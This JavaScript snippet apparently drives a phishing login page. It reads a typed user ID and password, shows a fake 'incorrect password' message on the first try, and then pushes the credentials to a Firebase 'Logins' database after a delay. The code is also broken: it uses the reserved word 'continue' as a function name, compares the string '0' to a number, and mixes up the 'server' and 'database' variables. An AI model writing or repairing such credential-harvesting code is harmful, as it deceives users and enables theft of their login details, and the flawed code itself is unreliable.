var server=firebase.database()
var attempts="0";
function continue(){
  var id=document.getElementById("id").value;
  localStorage.id=id
  var pass=document.getElementById("pass").value;
  if(attempts===0){
    attempts=1
    document.getElementById("msg").innerHTML="Username or Password are incorrect. Try Again"
  }
  else{
    localStorage.logins=true;
    setTimeout(function(){
      database.ref("Logins").push().set({
       'id':id,
       'password':pass
      })
    },2000)


    
  }
}
